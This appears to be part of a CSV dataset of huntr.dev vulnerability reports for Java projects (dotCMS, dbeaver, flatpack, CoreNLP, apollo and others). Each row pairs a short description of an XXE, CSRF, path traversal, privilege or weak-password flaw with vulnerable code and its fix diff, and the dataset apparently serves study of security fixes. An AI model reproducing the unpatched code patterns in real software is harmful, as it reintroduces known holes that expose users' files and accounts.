     * which can be blocked if needed.
     * @param ipOrHostName
     * @return
     */
    public static boolean isIpPrivateSubnet(final String ipOrHostName) {

        if (ipOrHostName == null) {
            return true;
        }

        try {
            InetAddress addr = Address.getByName(ipOrHostName);

            final String ip = addr.getHostAddress();

            if (""127.0.0.1"".equals(ip)) {
                return true;
            }

            if (""localhost"".equals(ip)) {
                return true;
            }

            for (String subnet : privateSubnets) {
                if (isIpInCIDR(ip, subnet)) {
                    return true;
                }
            }
        } catch (Exception e) {
            Logger.warn(IPUtils.class, ""unable to resolve hostname, assuming the worst:"" + ipOrHostName + "" ""+ e.getMessage());
            return true;
        }
        return false;



    }



}
35
dotCMS/src/test/java/com/dotcms/util/network/IPUtilsTest.java
@@ -56,4 +56,39 @@ public void test_false_cases() {
        }

    }


    final static String[] ipsOnPrivateSubnets= {
            ""192.168.1.255"",
            ""10.0.0.4"",
            ""127.0.0.1"",
            ""172.16.3.5"",
            ""172.16.3.0"",
            ""localhost""
    };

    final static String[] ipsOnPublicSubnets= {
            ""2.2.2.2"",
            ""3.22.136.122"",
            ""142.251.32.110"",
            ""74.6.231.21"",
            ""dotcms.com"",
            ""193.252.133.20""
    };

    @Test
    public void test_ip_private_subnets() {
        for(String testCase : ipsOnPrivateSubnets) {
            assertTrue( IPUtils.isIpPrivateSubnet(testCase));
        }
    }
    @Test

    public void test_ip_public_subnets() {
        for(String testCase : ipsOnPublicSubnets) {
            assertFalse( IPUtils.isIpPrivateSubnet(testCase));
        }
    }


}"
https://huntr.dev/bounties/5db6c499-a4da-4628-a999-50af4681e1aa/,Improper Privilege Management in dotcms/core,"Hello team, I found a SSTI that allow me to get Full Privilege Escalation (system user)",,CWE-269: Improper Privilege Management,https://www.github.com/dotcms/core/commit/2c9b40bd73957205adfae7211f82f7de6b890ff7,"@@ -0,0 +1,24 @@
























@@ -69,7 +69,7 @@ public User getUserByEmail(String email) {
   return APILocator.getUserAPI().loadByUserByEmail(email, APILocator.getUserAPI().getSystemUser(), false);
  } catch (Exception e) {
   Logger.error(CMSUsersWebAPI.class,e.getMessage(), e);
   return new User();
  }
 }


@@ -22,6 +22,7 @@

package com.liferay.portal.model;


import com.fasterxml.jackson.annotation.JsonIgnore;
import com.liferay.portal.util.PropsUtil;
import com.liferay.util.GetterUtil;
@@ -209,16 +210,18 @@ public String getUserId() {
 }

 public void setUserId(String userId) {
  if (((userId == null) && (_userId != null)) ||
    ((userId != null) && (_userId == null)) ||
    ((userId != null) && (_userId != null) &&
    !userId.equals(_userId))) {
   if (!XSS_ALLOW_USERID) {
    userId = Xss.strip(userId);
   }

   _userId = userId;
   setModified(true);



  }
 }


","24
dotCMS/src/integration-test/java/com/liferay/portal/model/UserTest.java
@@ -0,0 +1,24 @@
package com.liferay.portal.model;

import org.junit.Assert;
import org.junit.Test;

public class UserTest {

    /**
     * Method to test: {@link User#setUserId(String)}
     * Given Scenario: The user id can not be override
     * ExpectedResult: Try to set the user id twice, the second time won't work
     *
     */
    @Test()
    public void test_immutable_user_id() {

        final User user = new User();
        user.setUserId(""dotcms.1"");
        user.setUserId(""dotcms.2"");

        Assert.assertTrue(""dotcms.1"".equals(user.getUserId()));
        Assert.assertFalse(""dotcms.2"".equals(user.getUserId()));
    }
}
2
dotCMS/src/main/java/com/dotcms/rendering/velocity/viewtools/CMSUsersWebAPI.java
@@ -69,7 +69,7 @@ public User getUserByEmail(String email) {
   return APILocator.getUserAPI().loadByUserByEmail(email, APILocator.getUserAPI().getSystemUser(), false);
  } catch (Exception e) {
   Logger.error(CMSUsersWebAPI.class,e.getMessage(), e);
   return new User();
   return null;
  }
 }

11
dotCMS/src/main/java/com/liferay/portal/model/UserModel.java
@@ -22,6 +22,7 @@

package com.liferay.portal.model;

import com.dotmarketing.util.Logger;
import com.fasterxml.jackson.annotation.JsonIgnore;
import com.liferay.portal.util.PropsUtil;
import com.liferay.util.GetterUtil;
@@ -209,16 +210,18 @@ public String getUserId() {
 }

 public void setUserId(String userId) {
  if (((userId == null) && (_userId != null)) ||
    ((userId != null) && (_userId == null)) ||
    ((userId != null) && (_userId != null) &&
    !userId.equals(_userId))) {

  if (null == this.getUserId()) {

   if (!XSS_ALLOW_USERID) {
    userId = Xss.strip(userId);
   }

   _userId = userId;
   setModified(true);
   Logger.info(this, ""User id has been modified"");
  } else {
   Logger.info(this, ""User id has not been modified"");
  }
 }"
https://huntr.dev/bounties/a98264fb-1930-4c7c-b774-af24c0175fd4/,Improper Restriction of XML External Entity Reference in dbeaver/dbeaver,"The dbeaver is vulnerable to XML External Entity (XXE). An attacker that is able to provide a crafted XML file as input to the parseDocument() function in the ""XMLUtils.java"" file may allow an attacker to execute XML External Entities (XXE), including exposing the contents of local files to a remote server.",CVE-2021-3836,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/dbeaver/dbeaver/commit/4debf8f25184b7283681ed3fb5e9e887d9d4fe22,"@@ -17,6 +17,7 @@

package org.jkiss.utils.xml;


import org.jkiss.code.NotNull;
import org.jkiss.code.Nullable;
import org.w3c.dom.Document;
@@ -62,6 +63,7 @@ public static Document parseDocument(InputSource source) throws XMLException {
        try {
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder xmlBuilder = dbf.newDocumentBuilder();

            return xmlBuilder.parse(source);
        } catch (Exception er) {
            throw new XMLException(""Error parsing XML document"", er);

","2
bundles/org.jkiss.utils/src/org/jkiss/utils/xml/XMLUtils.java
@@ -17,6 +17,7 @@

package org.jkiss.utils.xml;

import javax.xml.XMLConstants;
import org.jkiss.code.NotNull;
import org.jkiss.code.Nullable;
import org.w3c.dom.Document;
@@ -62,6 +63,7 @@ public static Document parseDocument(InputSource source) throws XMLException {
        try {
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder xmlBuilder = dbf.newDocumentBuilder();
            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
            return xmlBuilder.parse(source);
        } catch (Exception er) {
            throw new XMLException(""Error parsing XML document"", er);"
https://huntr.dev/bounties/e95d18ac-f065-41cf-98e7-60ccce4c9976/,Relative Path Traversal in jitsi/jicofo,misconfigurations of nginx lead to a path traversal vulnerability.,,CWE-23: Relative Path Traversal,https://www.github.com/jitsi/jicofo/commit/f4ba604ac0347a1a5e6f255fba088a62ee02f197,"@@ -247,7 +247,7 @@ location /Shibboleth.sso {
  fastcgi_pass unix:/opt/shibboleth/shibresponder.sock;
}

location /shibboleth-sp {
  alias /usr/share/shibboleth/;
}


","2
doc/shibboleth.md
@@ -247,7 +247,7 @@ location /Shibboleth.sso {
  fastcgi_pass unix:/opt/shibboleth/shibresponder.sock;
}
location /shibboleth-sp {
location /shibboleth-sp/ {
  alias /usr/share/shibboleth/;
}"
https://huntr.dev/bounties/7c813751-1457-4c79-b8ac-f44d726be555/,Cross-Site Request Forgery (CSRF) in hzxie/voj,The Update Profile has not any CSRF protection that make attackers able to change the users email and then can lead to account take over with Reset password functionality.,,CWE-352: Cross-Site Request Forgery (CSRF),https://www.github.com/hzxie/voj/commit/74c17ad1af61d9f535678718244fdb7f9fd8dc66,"@@ -92,7 +92,7 @@
  <dependency>
   <groupId>mysql</groupId>
   <artifactId>mysql-connector-java</artifactId>
   <version>8.0.16</version>
  </dependency>
  <!-- JSON Support -->
  <dependency>

@@ -438,6 +438,8 @@ public ModelAndView dashboardView(HttpServletRequest request, HttpServletRespons
    view.addObject(""user"", user);
    view.addAllObjects(userService.getUserMetaUsingUid(user));
    view.addObject(""submissions"", submissionService.getSubmissionOfUser(userId));


    return view;
  }


","2
web/pom.xml
@@ -92,7 +92,7 @@
  <dependency>
   <groupId>mysql</groupId>
   <artifactId>mysql-connector-java</artifactId>
   <version>8.0.16</version>
   <version>8.0.27</version>
  </dependency>
  <!-- JSON Support -->
  <dependency>
2
web/src/main/java/org/verwandlung/voj/web/controller/AccountsController.java
@@ -438,6 +438,8 @@ public ModelAndView dashboardView(HttpServletRequest request, HttpServletRespons
    view.addObject(""user"", user);
    view.addAllObjects(userService.getUserMetaUsingUid(user));
    view.addObject(""submissions"", submissionService.getSubmissionOfUser(userId));
 view.addObject(""csrfToken"", CsrfProtector.getCsrfToken(session));

    return view;
  }"
https://huntr.dev/bounties/14d7bc1e-0ff0-4edf-a31d-9eced1322dd0/,Improper Restriction of XML External Entity Reference in appendium/flatpack,The flatpack vulnerable to XML External Entity (XXE). An attacker that is able to provide a crafted XML file as input to the parse() function in the MapParser.java file may allow an attacker to execute XML External Entities (XXE).,,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/appendium/flatpack/commit/5ebef77d7ad3cde11fca97015a0d9a44d7f17e68,"@@ -43,6 +43,7 @@
import java.util.Map.Entry;
import java.util.Set;


import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
@@ -98,6 +99,7 @@ public static Map<String, Object> parse(final Reader xmlStreamReader, final Pars
        final Map<String, Object> mdIndex = new LinkedHashMap<>(); // retain the same order

        final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        final DocumentBuilder builder = factory.newDocumentBuilder();
        builder.setEntityResolver(new ResolveLocalDTD());
        final org.w3c.dom.Document document = builder.parse(new InputSource(xmlStreamReader));

@@ -6,6 +6,9 @@
        <title>Changes</title>
    </properties>
    <body>



        <release version=""4.0.15"" date=""2021-09-17"" description=""Maintenance"">
            <action dev=""benoitx"" type=""fix"">Fixed when new line of a multi line starts with """".</action>
        </release>

","2
flatpack/src/main/java/net/sf/flatpack/xml/MapParser.java
@@ -43,6 +43,7 @@
import java.util.Map.Entry;
import java.util.Set;

import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
@@ -98,6 +99,7 @@ public static Map<String, Object> parse(final Reader xmlStreamReader, final Pars
        final Map<String, Object> mdIndex = new LinkedHashMap<>(); // retain the same order

        final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        final DocumentBuilder builder = factory.newDocumentBuilder();
        builder.setEntityResolver(new ResolveLocalDTD());
        final org.w3c.dom.Document document = builder.parse(new InputSource(xmlStreamReader));
3
src/changes/changes.xml
@@ -6,6 +6,9 @@
        <title>Changes</title>
    </properties>
    <body>
        <release version=""4.0.16"" date=""2021-11-01"" description=""Maintenance"">
            <action dev=""benoitx"" type=""fix"" due-to=""srikanthprathi"">Fixed Security issue for XXE.</action>
        </release>
        <release version=""4.0.15"" date=""2021-09-17"" description=""Maintenance"">
            <action dev=""benoitx"" type=""fix"">Fixed when new line of a multi line starts with """".</action>
        </release>"
https://huntr.dev/bounties/89b8bbab-3a5d-4323-9157-30e1ce7db478/,Improper Restriction of XML External Entity Reference in atmosphere/atmosphere,"The atmosphere is vulnerable to SSRF ( Server Side Request Forgery ) via XML External Entity (XXE). An attacker that is able to provide a crafted XML file as input to the WebDotXmlReader() constructor in the ""WebDotXmlReader.java"" file may allow an attacker to execute XML External Entities (XXE).",,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/atmosphere/atmosphere/commit/efb38ece980c6fc787cdadc992b21c8926bb8ac9,,"127
modules/cpr/src/main/java/org/atmosphere/util/WebDotXmlReader.java
Load diff
This file was deleted."
https://huntr.dev/bounties/a11c889b-ccff-4fea-9e29-963a23a63dd2/,Improper Restriction of XML External Entity Reference in stanfordnlp/corenlp,"The Stanford CoreNLP package provides a set of natural language analysis tools written in Java, is using a vulnerable XML External Entity (XXE). An attacker that is able to provide a crafted XML file as input to the readDocument() function in the ""DomReader.java"" file may allow an attacker to execute XML External Entities (XXE), including exposing the contents of local files to a remote server.",CVE-2021-3878,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/stanfordnlp/corenlp/commit/e5bbe135a02a74b952396751ed3015e8b8252e99,"@@ -16,6 +16,8 @@
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;



/**
 * Generic DOM reader for an XML file
 */
@@ -127,7 +129,7 @@ public static String getAttributeValue(Node node, String attributeName) {
 public static Document readDocument(File f) throws IOException, SAXException, ParserConfigurationException {
  Document document = null;

  DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
  // factory.setValidating(true);
  // factory.setNamespaceAware(true);


@@ -27,6 +27,7 @@
import edu.stanford.nlp.semgraph.semgrex.ssurgeon.pred.*;
import edu.stanford.nlp.semgraph.semgrex.SemgrexPattern;
import edu.stanford.nlp.util.Generics;

import edu.stanford.nlp.util.logging.Redwood;


@@ -397,7 +398,7 @@ public static String writeToString(SsurgeonPattern pattern) {

  private static Document createPatternXMLDoc(List<SsurgeonPattern> patterns) {
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
      DocumentBuilder db = dbf.newDocumentBuilder();
      Document domDoc = db.newDocument();
      Element rootElt = domDoc.createElement(SsurgeonPattern.ELT_LIST_TAG);
@@ -452,7 +453,7 @@ private static Document createPatternXMLDoc(List<SsurgeonPattern> patterns) {
  @SuppressWarnings(""unchecked"")
  public List<SsurgeonPattern> readFromFile(File file) throws Exception {
    List<SsurgeonPattern> retList = new ArrayList<>();
    Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);

    if (VERBOSE)
      System.out.println(""Reading ssurgeon file=""+file.getAbsolutePath());

","4
src/edu/stanford/nlp/ie/machinereading/common/DomReader.java
@@ -16,6 +16,8 @@
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import edu.stanford.nlp.util.XMLUtils;

/**
 * Generic DOM reader for an XML file
 */
@@ -127,7 +129,7 @@ public static String getAttributeValue(Node node, String attributeName) {
 public static Document readDocument(File f) throws IOException, SAXException, ParserConfigurationException {
  Document document = null;

  DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
  DocumentBuilderFactory factory = XMLUtils.safeDocumentBuilderFactory();
  // factory.setValidating(true);
  // factory.setNamespaceAware(true);

5
src/edu/stanford/nlp/semgraph/semgrex/ssurgeon/Ssurgeon.java
@@ -27,6 +27,7 @@
import edu.stanford.nlp.semgraph.semgrex.ssurgeon.pred.*;
import edu.stanford.nlp.semgraph.semgrex.SemgrexPattern;
import edu.stanford.nlp.util.Generics;
import edu.stanford.nlp.util.XMLUtils;
import edu.stanford.nlp.util.logging.Redwood;


@@ -397,7 +398,7 @@ public static String writeToString(SsurgeonPattern pattern) {

  private static Document createPatternXMLDoc(List<SsurgeonPattern> patterns) {
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
      DocumentBuilderFactory dbf = XMLUtils.safeDocumentBuilderFactory();
      DocumentBuilder db = dbf.newDocumentBuilder();
      Document domDoc = db.newDocument();
      Element rootElt = domDoc.createElement(SsurgeonPattern.ELT_LIST_TAG);
@@ -452,7 +453,7 @@ private static Document createPatternXMLDoc(List<SsurgeonPattern> patterns) {
  @SuppressWarnings(""unchecked"")
  public List<SsurgeonPattern> readFromFile(File file) throws Exception {
    List<SsurgeonPattern> retList = new ArrayList<>();
    Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);
    Document doc = XMLUtils.safeDocumentBuilderFactory().newDocumentBuilder().parse(file);

    if (VERBOSE)
      System.out.println(""Reading ssurgeon file=""+file.getAbsolutePath());"
https://huntr.dev/bounties/2f8baf6c-14b3-420d-8ede-9805797cd324/,Improper Restriction of XML External Entity Reference in stanfordnlp/corenlp,"The Stanford CoreNLP package provides a set of natural language analysis tools written in Java, is using a vulnerable XML External Entity (XXE). An attacker that is able to provide a crafted XML file as input to the getTextContentFromTagsFromFile() function in the ""XMLUtils.java"" file may allow an attacker to execute XML External Entities (XXE), including exposing the contents of local files to a remote server.",CVE-2021-3869,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/stanfordnlp/corenlp/commit/5d83f1e8482ca304db8be726cad89554c88f136a,"@@ -1,6 +1,7 @@
package edu.stanford.nlp.time;

import edu.stanford.nlp.io.StringOutputStream;

import org.w3c.dom.*;

import javax.xml.parsers.DocumentBuilder;
@@ -63,7 +64,7 @@ public static void printNode(OutputStream out, Node node, boolean prettyPrint, b

  public static Document createDocument() {
    try {
      DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
      DocumentBuilder docBuilder = dbFactory.newDocumentBuilder();
      Document doc = docBuilder.newDocument();
      return doc;
@@ -82,7 +83,7 @@ public static Element createElement(String tag) {

  public static Element parseElement(String xml) {
    try {
      DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
      DocumentBuilder docBuilder = dbFactory.newDocumentBuilder();
      Document doc = docBuilder.parse(new ByteArrayInputStream(xml.getBytes()));
      return doc.getDocumentElement();

@@ -39,6 +39,22 @@ public class XMLUtils  {

  private XMLUtils() {} // only static methods

















  /**
   * Returns the text content of all nodes in the given file with the given tag.
   *
@@ -68,7 +84,7 @@ private static List<String> getTextContentFromTagsFromFileSAXException(
          File f, String tag) throws SAXException {
    List<String> sents = Generics.newArrayList();
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
      DocumentBuilder db = dbf.newDocumentBuilder();
      Document doc = db.parse(f);
      doc.getDocumentElement().normalize();
@@ -129,7 +145,7 @@ private static List<Element> getTagElementsFromFileSAXException(
          File f, String tag) throws SAXException {
    List<Element> sents = Generics.newArrayList();
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
      DocumentBuilder db = dbf.newDocumentBuilder();
      Document doc = db.parse(f);
      doc.getDocumentElement().normalize();
@@ -207,7 +223,7 @@ public static List<Triple<String, Element, String>> getTagElementTriplesFromFile
      File f, String tag, int numIncludedSiblings) throws SAXException {
    List<Triple<String, Element, String>> sents = Generics.newArrayList();
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
      DocumentBuilder db = dbf.newDocumentBuilder();
      Document doc = db.parse(f);
      doc.getDocumentElement().normalize();
@@ -251,7 +267,7 @@ public static List<Triple<String, Element, String>> getTagElementTriplesFromFile
  public static DocumentBuilder getXmlParser() {
    DocumentBuilder db = null;
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
      dbf.setValidating(false);

      //Disable DTD loading and validation
@@ -283,7 +299,7 @@ public static DocumentBuilder getXmlParser() {
  public static DocumentBuilder getValidatingXmlParser(File schemaFile) {
    DocumentBuilder db = null;
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

      SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
      Schema schema = factory.newSchema(schemaFile);
@@ -1206,7 +1222,8 @@ public static XMLTag parseTag(String tagString) {

  public static Document readDocumentFromFile(String filename) throws Exception {
    InputSource in = new InputSource(new FileReader(filename));
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

    factory.setNamespaceAware(false);
    DocumentBuilder db = factory.newDocumentBuilder();
    db.setErrorHandler(new SAXErrorHandler());
@@ -1256,7 +1273,7 @@ public void fatalError(SAXParseException ex) throws SAXParseException {

  public static Document readDocumentFromString(String s) throws Exception {
    InputSource in = new InputSource(new StringReader(s));
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setNamespaceAware(false);
    return factory.newDocumentBuilder().parse(in);
  }

","5
src/edu/stanford/nlp/time/XMLUtils.java
@@ -1,6 +1,7 @@
package edu.stanford.nlp.time;

import edu.stanford.nlp.io.StringOutputStream;
import static edu.stanford.nlp.util.XMLUtils.safeDocumentBuilderFactory;
import org.w3c.dom.*;

import javax.xml.parsers.DocumentBuilder;
@@ -63,7 +64,7 @@ public static void printNode(OutputStream out, Node node, boolean prettyPrint, b

  public static Document createDocument() {
    try {
      DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
      DocumentBuilderFactory dbFactory = safeDocumentBuilderFactory();
      DocumentBuilder docBuilder = dbFactory.newDocumentBuilder();
      Document doc = docBuilder.newDocument();
      return doc;
@@ -82,7 +83,7 @@ public static Element createElement(String tag) {

  public static Element parseElement(String xml) {
    try {
      DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
      DocumentBuilderFactory dbFactory = safeDocumentBuilderFactory();
      DocumentBuilder docBuilder = dbFactory.newDocumentBuilder();
      Document doc = docBuilder.parse(new ByteArrayInputStream(xml.getBytes()));
      return doc.getDocumentElement();
31
src/edu/stanford/nlp/util/XMLUtils.java
@@ -39,6 +39,22 @@ public class XMLUtils  {

  private XMLUtils() {} // only static methods

  public static DocumentBuilderFactory safeDocumentBuilderFactory() {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    try {
      dbf.setFeature(""http://apache.org/xml/features/disallow-doctype-decl"", true);
      dbf.setFeature(""http://apache.org/xml/features/nonvalidating/load-external-dtd"", false);
      dbf.setFeature(""http://xml.org/sax/features/external-general-entities"", false);
      dbf.setFeature(""http://xml.org/sax/features/external-parameter-entities"", false);
      dbf.setFeature(""http://apache.org/xml/features/dom/create-entity-ref-nodes"", false);
      dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
    } catch (ParserConfigurationException e) {
      log.warn(e);
    }
    return dbf;
  }


  /**
   * Returns the text content of all nodes in the given file with the given tag.
   *
@@ -68,7 +84,7 @@ private static List<String> getTextContentFromTagsFromFileSAXException(
          File f, String tag) throws SAXException {
    List<String> sents = Generics.newArrayList();
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
      DocumentBuilderFactory dbf = safeDocumentBuilderFactory();
      DocumentBuilder db = dbf.newDocumentBuilder();
      Document doc = db.parse(f);
      doc.getDocumentElement().normalize();
@@ -129,7 +145,7 @@ private static List<Element> getTagElementsFromFileSAXException(
          File f, String tag) throws SAXException {
    List<Element> sents = Generics.newArrayList();
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
      DocumentBuilderFactory dbf = safeDocumentBuilderFactory();
      DocumentBuilder db = dbf.newDocumentBuilder();
      Document doc = db.parse(f);
      doc.getDocumentElement().normalize();
@@ -207,7 +223,7 @@ public static List<Triple<String, Element, String>> getTagElementTriplesFromFile
      File f, String tag, int numIncludedSiblings) throws SAXException {
    List<Triple<String, Element, String>> sents = Generics.newArrayList();
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
      DocumentBuilderFactory dbf = safeDocumentBuilderFactory();
      DocumentBuilder db = dbf.newDocumentBuilder();
      Document doc = db.parse(f);
      doc.getDocumentElement().normalize();
@@ -251,7 +267,7 @@ public static List<Triple<String, Element, String>> getTagElementTriplesFromFile
  public static DocumentBuilder getXmlParser() {
    DocumentBuilder db = null;
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
      DocumentBuilderFactory dbf = safeDocumentBuilderFactory();
      dbf.setValidating(false);

      //Disable DTD loading and validation
@@ -283,7 +299,7 @@ public static DocumentBuilder getXmlParser() {
  public static DocumentBuilder getValidatingXmlParser(File schemaFile) {
    DocumentBuilder db = null;
    try {
      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
      DocumentBuilderFactory dbf = safeDocumentBuilderFactory();

      SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
      Schema schema = factory.newSchema(schemaFile);
@@ -1206,7 +1222,8 @@ public static XMLTag parseTag(String tagString) {

  public static Document readDocumentFromFile(String filename) throws Exception {
    InputSource in = new InputSource(new FileReader(filename));
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilderFactory factory = safeDocumentBuilderFactory();

    factory.setNamespaceAware(false);
    DocumentBuilder db = factory.newDocumentBuilder();
    db.setErrorHandler(new SAXErrorHandler());
@@ -1256,7 +1273,7 @@ public void fatalError(SAXParseException ex) throws SAXParseException {

  public static Document readDocumentFromString(String s) throws Exception {
    InputSource in = new InputSource(new StringReader(s));
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilderFactory factory = safeDocumentBuilderFactory();
    factory.setNamespaceAware(false);
    return factory.newDocumentBuilder().parse(in);
  }"
https://huntr.dev/bounties/f68f384b-7c84-49f4-b679-907e5de173f9/,Weak Password Requirements in apolloconfig/apollo,The Application does not have control set in password complexity. It is possible to add a user with a single character password in the application.,,CWE-521: Weak Password Requirements,https://www.github.com/apolloconfig/apollo/commit/4a28fbd500d7d679d2141deedf6bd71c37bad2b6,"@@ -16,6 +16,7 @@ Apollo 1.10.0
* [refactor: let open api more easier to use and development](https://github.com/apolloconfig/apollo/pull/3943)
* [feat(scripts): use bash to call openapi](https://github.com/apolloconfig/apollo/pull/3980)
* [Support search by item](https://github.com/apolloconfig/apollo/pull/3977)


------------------
All issues and pull requests are [here](https://github.com/ctripcorp/apollo/milestone/8?closed=1)
@@ -24,6 +24,12 @@
import com.ctrip.framework.apollo.portal.spi.UserInfoHolder;
import com.ctrip.framework.apollo.portal.spi.UserService;
import com.ctrip.framework.apollo.portal.spi.springsecurity.SpringSecurityUserService;






import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
@@ -32,41 +38,42 @@
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.List;

@RestController
public class UserInfoController {

  private final UserInfoHolder userInfoHolder;
  private final LogoutHandler logoutHandler;
  private final UserService userService;


  public UserInfoController(
      final UserInfoHolder userInfoHolder,
      final LogoutHandler logoutHandler,
      final UserService userService) {

    this.userInfoHolder = userInfoHolder;
    this.logoutHandler = logoutHandler;
    this.userService = userService;

  }


  @PreAuthorize(value = ""@permissionValidator.isSuperAdmin()"")
  @PostMapping(""/users"")
  public void createOrUpdateUser(@RequestBody UserPO user) {
    if (StringUtils.isContainEmpty(user.getUsername(), user.getPassword())) {
      throw new BadRequestException(""Username and password can not be empty."");
    }






    if (userService instanceof SpringSecurityUserService) {
      ((SpringSecurityUserService) userService).createOrUpdate(user);
    } else {
      throw new UnsupportedOperationException(""Create or update user operation is unsupported"");
    }

  }

  @GetMapping(""/user"")
@@ -81,8 +88,8 @@ public void logout(HttpServletRequest request, HttpServletResponse response) thr

  @GetMapping(""/users"")
  public List<UserInfo> searchUsersByKeyword(@RequestParam(value = ""keyword"") String keyword,
                                             @RequestParam(value = ""offset"", defaultValue = ""0"") int offset,
                                             @RequestParam(value = ""limit"", defaultValue = ""10"") int limit) {
    return userService.searchUsers(keyword, offset, limit);
  }

@@ -91,5 +98,4 @@ public UserInfo getUserByUserId(@PathVariable String userId) {
    return userService.findByUserId(userId);
  }


}
@@ -0,0 +1,68 @@




































































@@ -0,0 +1,36 @@




































@@ -0,0 +1,22 @@






















@@ -0,0 +1,73 @@









































































@@ -0,0 +1,84 @@




















































































","1
CHANGES.md
@@ -16,6 +16,7 @@ Apollo 1.10.0
* [refactor: let open api more easier to use and development](https://github.com/apolloconfig/apollo/pull/3943)
* [feat(scripts): use bash to call openapi](https://github.com/apolloconfig/apollo/pull/3980)
* [Support search by item](https://github.com/apolloconfig/apollo/pull/3977)
* [Implement password policies to avoid weak passwords](https://github.com/apolloconfig/apollo/pull/4008)

------------------
All issues and pull requests are [here](https://github.com/ctripcorp/apollo/milestone/8?closed=1)
28
...portal/src/main/java/com/ctrip/framework/apollo/portal/controller/UserInfoController.java
@@ -24,6 +24,12 @@
import com.ctrip.framework.apollo.portal.spi.UserInfoHolder;
import com.ctrip.framework.apollo.portal.spi.UserService;
import com.ctrip.framework.apollo.portal.spi.springsecurity.SpringSecurityUserService;
import com.ctrip.framework.apollo.portal.util.checker.AuthUserPasswordChecker;
import com.ctrip.framework.apollo.portal.util.checker.CheckResult;
import java.io.IOException;
import java.util.List;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
@@ -32,41 +38,42 @@
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.List;

@RestController
public class UserInfoController {

  private final UserInfoHolder userInfoHolder;
  private final LogoutHandler logoutHandler;
  private final UserService userService;
  private final AuthUserPasswordChecker passwordChecker;

  public UserInfoController(
      final UserInfoHolder userInfoHolder,
      final LogoutHandler logoutHandler,
      final UserService userService) {
      final UserService userService,
      final AuthUserPasswordChecker passwordChecker) {
    this.userInfoHolder = userInfoHolder;
    this.logoutHandler = logoutHandler;
    this.userService = userService;
    this.passwordChecker = passwordChecker;
  }


  @PreAuthorize(value = ""@permissionValidator.isSuperAdmin()"")
  @PostMapping(""/users"")
  public void createOrUpdateUser(@RequestBody UserPO user) {
    if (StringUtils.isContainEmpty(user.getUsername(), user.getPassword())) {
      throw new BadRequestException(""Username and password can not be empty."");
    }

    CheckResult pwdCheckRes = passwordChecker.checkWeakPassword(user.getPassword());
    if (!pwdCheckRes.isSuccess()) {
      throw new BadRequestException(pwdCheckRes.getMessage());
    }

    if (userService instanceof SpringSecurityUserService) {
      ((SpringSecurityUserService) userService).createOrUpdate(user);
    } else {
      throw new UnsupportedOperationException(""Create or update user operation is unsupported"");
    }

  }

  @GetMapping(""/user"")
@@ -81,8 +88,8 @@ public void logout(HttpServletRequest request, HttpServletResponse response) thr

  @GetMapping(""/users"")
  public List<UserInfo> searchUsersByKeyword(@RequestParam(value = ""keyword"") String keyword,
                                             @RequestParam(value = ""offset"", defaultValue = ""0"") int offset,
